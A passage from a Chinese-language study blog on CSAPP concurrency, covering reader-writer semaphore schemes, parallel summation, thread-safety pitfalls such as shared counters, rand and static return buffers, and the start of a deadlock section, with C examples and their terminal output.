<p>当写者1写完出了临界区,他释放了w锁,此时w锁的等待队列中有成百上千的写者和一个读者.但是<code>sem_wait(&amp;w);</code>并不知道是读者还是写者在等待w,它会随便挑一个正在等待<code>w</code>的线程分配w锁.</p>
<p>显然一个读者是抢不过成千上万个写者的.</p>
<p>这个可怜的读者只有很小的几率能够进入临界区去读这些作家的著作了</p>
<p>但是只要读者数量多点儿,稍微有点儿规模就没有作家的事了</p>
<p>读者1进入临界区之后给所有读者开了绿色通道,读者鱼贯而入,当首先进入临界区的读者1出了临界区时,还会有读者2守着临界区的大门不让作家进来.</p>
<p>甚至当读者1兜兜转转又站在临界区大门口时,临界区中还有读者n把这门.如此形成一道密不透风的墙,作家永远没有进入临界区的机会</p>
<blockquote>
<p>这让我想到保卫萝卜中用冰花阵一直冻住怪物直到刮痧刮死</p>
<p>冰花绽放的一秒相当于读者持有w锁,冰花凋谢相当于读者释放w锁</p>
<p>冰花的cd相当于读者本次出了临界区到下一次进入临界区之前的时间空当</p>
<p>冰花阵无间隙绽放相当于w锁一直被众多读者线程持有,永远轮不到写者持有w锁</p>
</blockquote>
<h4 id="写优先">写优先</h4>
<h5 id="作家-1">作家</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writer</span><span class="params">(<span class="type">void</span>*p)</span>&#123;</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(temp,<span class="string">&quot;modified by thread %ld&quot;</span>,pthread_self());</span><br><span class="line">    <span class="type">int</span> mytime=max_time;</span><br><span class="line">    <span class="keyword">while</span>(--mytime)&#123;</span><br><span class="line">        sem_wait(&amp;y);<span class="comment">//写者闸机</span></span><br><span class="line">        cnt_writer++;<span class="comment">//记录过了闸机的写者数量</span></span><br><span class="line">        <span class="keyword">if</span>(cnt_writer==<span class="number">1</span>)&#123;</span><br><span class="line">            sem_wait(&amp;rsem);<span class="comment">//只要是有一个写者,写者就要控制读者的锁</span></span><br><span class="line">        &#125;</span><br><span class="line">        sem_post(&amp;y);<span class="comment">//写者闸机</span></span><br><span class="line">        sem_wait(&amp;wsem);<span class="comment">//等待临界区清空时(上一个临界区中的线程可能是写者也可能是读者),允许一个写者控制写者锁,进入临界区</span></span><br><span class="line"></span><br><span class="line">        my_write(temp);<span class="comment">//访问临界区</span></span><br><span class="line">        </span><br><span class="line">        sem_post(&amp;wsem);<span class="comment">//本写者释放写者锁,允许下一个写者进入临界区,但是读者不可以,因为rsem锁尚未被释放</span></span><br><span class="line">        sem_wait(&amp;y);<span class="comment">//本写者要再次经过闸机离开了,需要对共享变量cnt_writer保护</span></span><br><span class="line">        cnt_writer--;</span><br><span class="line">        <span class="keyword">if</span>(cnt_writer==<span class="number">0</span>)&#123;</span><br><span class="line">            sem_post(&amp;rsem);<span class="comment">//最后一个写者离开时才放开读者锁rsem,此时读者才被允许进入临界区</span></span><br><span class="line">        &#125;   </span><br><span class="line">        sem_post(&amp;y);<span class="comment">//写者闸机</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个作家线程要考虑的事情:</p>
<p>1.首先要作家线程一个一个经过闸机,记录已经通过闸机,站在临界区门口的作家数量</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">     sem_wait(&amp;y);//写者闸机</span><br><span class="line">         cnt_writer++;//记录过了闸机的写者数量</span><br><span class="line">...</span><br><span class="line">     sem_post(&amp;y);//写者闸机</span><br></pre></td></tr></table></figure>
</blockquote>
<p>2.第一个站在临界区门口的作家需要给读者使个绊,上读者锁,不允许读者再进入临界区,目前在临界区中的读者就得过且过吧</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(cnt_writer==1)&#123;</span><br><span class="line">    sem_wait(&amp;rsem);//只要是有一个写者,写者就要控制读者的锁</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>3.本作家写作的时候不允许其他作家打扰</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sem_wait(&amp;wsem);<span class="comment">//等待临界区清空时(上一个临界区中的线程可能是写者也可能是读者),允许一个写者控制写者锁,进入临界区</span></span><br><span class="line"></span><br><span class="line">my_write(temp);<span class="comment">//访问临界区</span></span><br><span class="line"></span><br><span class="line">sem_post(&amp;wsem);<span class="comment">//本写者释放写者锁,允许下一个写者进入临界区,但是读者不可以,因为rsem锁尚未被释放</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>4.本作家写完了首先允许其他作家继续写作,直到最后一个离开临界区的作家放开读者锁,允许读者进入.作家离开时也要经过闸机严格计数</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sem_wait(&amp;y);<span class="comment">//本写者要再次经过闸机离开了,需要对共享变量cnt_writer保护</span></span><br><span class="line">cnt_writer--;</span><br><span class="line"><span class="keyword">if</span>(cnt_writer==<span class="number">0</span>)&#123;</span><br><span class="line">    sem_post(&amp;rsem);<span class="comment">//最后一个写者离开时才放开读者锁rsem,此时读者才被允许进入临界区</span></span><br><span class="line">&#125;   </span><br><span class="line">sem_post(&amp;y);<span class="comment">//写者闸机</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="读者-1">读者</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">reader</span><span class="params">(<span class="type">void</span> *p)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mytime=max_time;</span><br><span class="line">    <span class="keyword">while</span>(--mytime)&#123;</span><br><span class="line">        sem_wait(&amp;z);<span class="comment">//多层闸机</span></span><br><span class="line">        sem_wait(&amp;rsem);</span><br><span class="line">        sem_wait(&amp;x);</span><br><span class="line">        ++cnt_reader;</span><br><span class="line">        <span class="keyword">if</span>(cnt_reader==<span class="number">1</span>)&#123;</span><br><span class="line">            sem_wait(&amp;wsem);</span><br><span class="line">        &#125;</span><br><span class="line">        sem_post(&amp;x);</span><br><span class="line">        sem_post(&amp;rsem);</span><br><span class="line">        sem_post(&amp;z);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;in reader thread %ld,&quot;</span>,pthread_self());</span><br><span class="line">        my_read();</span><br><span class="line"></span><br><span class="line">        sem_wait(&amp;x);</span><br><span class="line">        --cnt_reader;</span><br><span class="line">        <span class="keyword">if</span>(cnt_reader==<span class="number">0</span>)&#123;</span><br><span class="line">            sem_post(&amp;wsem);</span><br><span class="line">        &#125;</span><br><span class="line">        sem_post(&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sem_wait(&amp;z)</span><br><span class="line">	sem_wait(&amp;rsem)</span><br><span class="line">	...</span><br><span class="line">	sem_post(&amp;rsem)</span><br><span class="line">sem_wait(&amp;z)</span><br></pre></td></tr></table></figure>
<p><code>&amp;rsem</code>信号量被嵌套在<code>&amp;z</code>里面,其目的是什么呢?需要完整分析一遍步骤</p>
<p>1.试想如果已经有写者给读者上了锁,</p>
<p>2.第一个读者会持有z锁并等待<code>rsem</code>锁,在<code>rsem</code>的等待队列上挂着</p>
<p>3.第二个及以后的读者无法获得z锁,都在z的等待队列上挂着</p>
<p>4.当所有写者退出临界区,最后一个写者释放了rsem锁,此时第一个读者终于获得了rsem锁,它执行了下面步骤</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sem_wait(&amp;x);<span class="comment">//读者闸机</span></span><br><span class="line">++cnt_reader;</span><br><span class="line"><span class="keyword">if</span>(cnt_reader==<span class="number">1</span>)&#123;</span><br><span class="line">    sem_wait(&amp;wsem);<span class="comment">//给写者上锁,次锁直到最后一个离开临界区的读者放开wsem锁</span></span><br><span class="line">&#125;</span><br><span class="line">sem_post(&amp;x);<span class="comment">//注意此处释放锁的顺序和刚才加锁的顺序正好相反,FILO</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果在即将执行<code>sem_wait(&amp;wsem)</code>时,如果来一个写者,由于读者1已经持有了<code>rsem</code>锁,因此该写者会卡在<code>sem_wait(&amp;rsem);</code>,写者根本没有可能抢到<code>wsem</code>锁.因此这里担心写者是多余的</p>
</blockquote>
<p>5.读者1释放<code>rsem</code>锁</p>
<blockquote>
<p>此时读者1仍然没有释放z锁,因此其他读者依旧进不来.并且wsem锁也没有被放开,写者也进不来</p>
</blockquote>
<p>7.读者1释放z锁,从一群读者中挑选了一个幸运儿读者2获得z锁,剩下的读者仍然挂在z的等待队列上</p>
<p>8.读者2持有z锁之后还要经过<code>rsem</code>闸机.</p>
<p>此时读者2可能面临两种情况:</p>
<blockquote>
<p>(1)如果在
"读者1获得<code>rsem</code>时到读者2企图持有<code>rsem</code>锁"
期间,<strong>有一个写者站在临界区门口,读者1已经释放<code>rsem</code>锁也有可能会分配给写者,该写者会持有rsem锁,导致读者2过不了rsem闸机</strong></p>
<p>诚如是,则读者2只持有z一个锁,不会影响写者.读者1后来也只会用到x锁,因此读者2也不会影响读者1.</p>
<p>实际上此时读者2的状态和读者1一开始的状态相同.</p>
</blockquote>
<blockquote>
<p>(2)如果期间没有写者到达,或者读者2足够幸运被分配了rsem锁</p>
<p>此时读者2的状态和读者1拿到rsem锁之后的状态相同</p>
</blockquote>
<p>此时读者1最慢还在访问临界区,最快已经通过x闸机走人了</p>
<blockquote>
<p>(1)如果读者1走人了那么读者2面临的状态和读者1完全相同</p>
</blockquote>
<blockquote>
<p>(2)读者1刚出临界区,马上要执行下面语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sem_wait(&amp;x);</span><br><span class="line">--cnt_reader;</span><br><span class="line"><span class="keyword">if</span>(cnt_reader==<span class="number">0</span>)&#123;</span><br><span class="line">    sem_post(&amp;wsem);</span><br><span class="line">&#125;</span><br><span class="line">sem_post(&amp;x);</span><br></pre></td></tr></table></figure>
<p>或许读者2和读者1会因为x发生互斥,但是这都是两个读者一个要进闸机一个要出闸机或者两个都出闸机的矛盾,对于其他锁无影响,此时写者最靠近临界区也得挂在<code>sem_wait(&amp;wsem);</code></p>
<p>只有当读者1和2都离开时,wsem才会释放,写者才<strong>会获得锁</strong></p>
</blockquote>
<p>到此可以得到z锁的作用:</p>
<p>当有写者持有<code>rsem</code>锁时,z锁保证,<code>rsem</code>等待队列上只允许最多有一个读者,该读者持有z锁导致其他读者无法挂到<code>rsem</code>等待队列上</p>
<p>写者对读者的影响:</p>
<p>当至少有一个写者在排队时,写者就会锁上<code>rsem</code>,让顶多一个读者挂在<code>rsem</code>上,其他读者挂在z上.</p>
<p>该挂在rsem上的读者一定是<strong>所有读者中</strong>最早进入临界区的.</p>
<p>只有当最后一个写者离开临界区时才会释放<code>rsem</code>锁,此时<code>rsem</code>上的读者获得<code>rsem</code>锁,</p>
<p>此时该读者持有<code>rsem</code>,z,其他读者依然得挂在z上</p>
<h2 id="多线程提高并发性">多线程提高并发性</h2>
<p>CSAPP上勉强举了一个例子,什么例子呢?</p>
<p>计算 <span class="math display">\[
\sum_{i=1}^n i
\]</span> 即正整数前n项和</p>
<p>为了使用并发,这里不用等差数列求和公式</p>
<p>CSAPP上说了这么一个意思,要开四个线程计算的话,每个线程负责计算10个数的和</p>
<p>假设<code>n=40</code>,</p>
<p>线程1就负责计算<span
class="math inline">\(\sum_{i=1}^{10}i\)</span></p>
<p>线程2就负责计算<span
class="math inline">\(\sum_{i=11}^{20}i\)</span></p>
<p>以此类推</p>
<p>各个线程的计算结果求和也是有讲究的</p>
<p>大体上有这么三种情况:</p>
<p>1.开一个全局变量<code>global_sum</code>,每个线程的每次循环直接将数加到<code>global_sum</code>上</p>
<p>2.开一个全局数组<code>global_sums[4]</code>,线程1每次循环将i加到<code>global_sums[0]</code>上,线程1每次循环将i加到<code>global_sums[1]</code>上,以此类推.最终在主线程中循环累加一下<code>global_sums</code></p>
<p>3.每个线程开一个局部变量<code>local_sum</code>,每次循环将i加到<code>local_sum</code>上,每个线程返回局部变量值交给主线程累加</p>
<p>第一种显然是不可以的,<code>global_sum</code>是一个临界区,不加保护被多线程访问会出现同步错误,解决方法是每个线程每次向<code>global_sum</code>加数的时候都要上锁下锁,但是这个时间代价非常大</p>
<p>第二种可以,但是全局数组是开在虚拟内存中的<code>.data</code>节上的,线程需要频繁地访问内存,时间代价也相对较大</p>
<p>第三种局部变量<code>local_sum</code>可能会优化为寄存器变量,诚如是,则速度会很快.即使<code>local_sum</code>被放在线程栈区,也比去<code>data</code>节访问内存快</p>
<p>CSAPP还给出的建议是,有几个处理器最多就开几个线程.每个处理器分别负责一个线程这时最大效率,如果线程数比处理器多则处理器会有线程调度,线程上下文的切换也会有时间开销</p>
<h2 id="线程安全问题">线程安全问题</h2>
<h3 id="线程不安全函数">线程不安全函数</h3>
<h4 id="不保护临界区的函数">不保护临界区的函数</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxn 1000000</span></span><br><span class="line"><span class="type">int</span> cnt=<span class="number">0</span>;<span class="comment">//全局变量作为临界区</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">count</span><span class="params">(<span class="type">void</span> *para)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;maxn;++i)&#123;</span><br><span class="line">        ++cnt;<span class="comment">//不保护临界区变量cnt</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid1,tid2;</span><br><span class="line">    pthread_create(&amp;tid1,<span class="literal">NULL</span>,count,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;tid2,<span class="literal">NULL</span>,count,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid2,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cnt=%d&quot;</span>,cnt);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/e/share/mydir]</span><br><span class="line">└─# ./mythread</span><br><span class="line">cnt=<span class="number">1024846</span></span><br></pre></td></tr></table></figure>
<p>期望的运行结果应该是<code>cnt=2000000</code>,实际上<code>cnt=1024846</code>,即同步错误</p>
<h4 id="保持跨越多个调用状态的函数">保持跨越多个调用状态的函数</h4>
<p>啥意思呢?本次函数调用的返回值依赖于先前的结果或者中间结果</p>
<p>比如伪随机数函数<code>rand</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601202115691.png"
alt="image-20220601202115691" />
<figcaption aria-hidden="true">image-20220601202115691</figcaption>
</figure>
<p>本次形成的<code>next_seed</code>会用在下一次伪随机数的生成.</p>
<p>如果两个线程同时获取了本次<code>next_seed</code>,那么可以预见的是,下一次两个线程生成的伪随机数是相同的</p>
<p>解决方法是,每次的随机数种子都有调用者传递,不同线程保存不同的种子.避开使用共享变量</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601205339539.png"
alt="image-20220601205339539" />
<figcaption aria-hidden="true">image-20220601205339539</figcaption>
</figure>
<p>这种不使用共享变量的线程安全函数叫做可重入函数</p>
<h4 id="返回指向静态变量的指针的函数">返回指向静态变量的指针的函数</h4>
<p>啥函数会返回静态变量呢?或者说为啥要返回静态变量呢?</p>
<p>首先glibc库中就有这种返回静态变量的函数,比如<code>ctime</code>函数.其存在是有合理性的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601202455160.png"
alt="image-20220601202455160" />
<figcaption aria-hidden="true">image-20220601202455160</figcaption>
</figure>
<blockquote>
<p>一个函数要返回一个字符串,该字符串在内存上应该放在哪里呢?</p>
<blockquote>
<p>如果函数这样写:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">getstr</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> str[] = <span class="string">&quot;dustball&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会报告警告:局部变量str作为返回</p>
<p>为啥会警告呢?str作为函数栈上变量,当函数返回之后,函数栈会被退掉.那么此时str指针指向的是一块没有被分配的内存区域.或者当主函数又调用新函数,新函数的函数栈覆盖掉getstr的函数栈时,此时str指针就指向了新函数的函数栈区.</p>
<p>即指针要么指向NULL,要么指向一个在生存期内的对象.否则就会成为野指针</p>
</blockquote>
<p>那么应该怎么写才能保证一个函数下才定义的变量在函数退出后依然存活呢?使用静态变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">getstr</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> str[] = <span class="string">&quot;dustball&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是因为静态变量会存放在.data或者.bss全局变量区,而不是放在函数栈下</p>
</blockquote>
<p>返回静态变量为什么就线程不安全了?比如下面程序<code>mythread.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxn 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">getstr</span><span class="params">(<span class="type">void</span> *para)</span> &#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="comment">// for(int i=0;i&lt;maxn;++i)&#123;</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buffer,<span class="string">&quot;str from thread %ld&quot;</span>,pthread_self());</span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid1;</span><br><span class="line">    <span class="type">pthread_t</span> tid2;</span><br><span class="line">    pthread_create(&amp;tid1,<span class="literal">NULL</span>,getstr,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;tid2,<span class="literal">NULL</span>,getstr,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span> *s1,*s2;</span><br><span class="line">    pthread_join(tid1,(<span class="type">void</span>**)&amp;s1);</span><br><span class="line">    pthread_join(tid2,(<span class="type">void</span>**)&amp;s2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n%s\n&quot;</span>,s1,s2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们期望的是分别从两个线程中获得两个字符串,在主线程中交给<code>s1,s2</code>保管</p>
<p>实际上<code>s1,s2</code>指向的是同一块内存地址,即都是<code>.data</code>区域的静态变量<code>buffer</code>,多线程不会拷贝全局变量区</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/e/share/mydir]</span><br><span class="line">└─# gcc mythread.c -o mythread -lpthread</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/e/share/mydir]</span><br><span class="line">└─# ./mythread</span><br><span class="line">str from thread 139788891407936</span><br><span class="line">str from thread 139788891407936</span><br></pre></td></tr></table></figure>
<p><strong>怎么解决 这类错误呢?</strong></p>
<p>我们现在指望的是函数主动返回一个值供我们引用,但是函数的局限性就是它多次调用只能返回一个值,实际上这个静态变量还是临界区</p>
<p>我们现在给函数提供一个内存区域,让函数把数据写到我们指定的区域,<strong>在不同的线程中指定不同的区域.这样就可以避免多个引用指向同一块内存区域,即不使用共享变量</strong></p>
<p>比如:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxn 100</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">getstr</span><span class="params">(<span class="type">void</span> *dest)</span> &#123;<span class="comment">//dest作为缓冲区</span></span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="type">char</span>*)dest,<span class="string">&quot;str from thread %ld&quot;</span>,pthread_self());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid1;</span><br><span class="line">    <span class="type">pthread_t</span> tid2;</span><br><span class="line">    <span class="type">char</span> s1[<span class="number">100</span>];<span class="comment">//在主线程申请栈上申请两个缓冲区,两个线程各自写入一块缓冲区</span></span><br><span class="line">    <span class="type">char</span> s2[<span class="number">100</span>];</span><br><span class="line">    pthread_create(&amp;tid1,<span class="literal">NULL</span>,getstr,(<span class="type">void</span>*)s1);<span class="comment">//在主线程创建对等线程的时候指定线程 使用哪一块缓冲区</span></span><br><span class="line">    pthread_create(&amp;tid2,<span class="literal">NULL</span>,getstr,(<span class="type">void</span>*)s2);</span><br><span class="line">    pthread_join(tid1,<span class="literal">NULL</span>);		<span class="comment">//不必使用函数返回值,直接写NULL</span></span><br><span class="line">    pthread_join(tid2,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n%s\n&quot;</span>,s1,s2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/e/share/mydir]</span><br><span class="line">└─# gcc mythread.c -o mythread -lpthread</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/e/share/mydir]</span><br><span class="line">└─# ./mythread</span><br><span class="line">str from thread 139961335383616</span><br><span class="line">str from thread 139961326990912</span><br></pre></td></tr></table></figure>
<h4 id="调用线程不安全函数的函数">调用线程不安全函数的函数</h4>
<p>线程调用的所有函数都是线程执行流的一部分,不光最高层的线程例程函数需要考虑线程安全性,只要是线程执行流上的所有涉及临界区的函数都应当考虑线程安全问题</p>
<h3 id="库函数的线程安全性">库函数的线程安全性</h3>
<p>大多数库函数都是线程安全的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601205715921.png"
alt="image-20220601205715921" />
<figcaption aria-hidden="true">image-20220601205715921</figcaption>
</figure>
<h2 id="死锁问题">死锁问题</h2>
<p>死锁问题大概是指:</p>
<p>线程1想要资源2但是资源2被线程2掌握</p>
<p>线程2想要资源1但是资源1被线程1掌握</p>
<p>没有获得资源则两个线程都需要中断或者忙等待.每个线程都不愿主动放弃已经获取的资源</p>
<blockquote>
<p>注意这里资源数量默认为1,也可以大于1,但是还是用1理解比较方便</p>
</blockquote>
<blockquote>
<p>更规范的定义:</p>
<p>如果一个进程集合中的每个进程都在等待只能由该进程集合中的其他进程才能引发的事件.那么该进程集合就是死锁的</p>
<blockquote>
<p>死锁是对一个进程集合而言的</p>
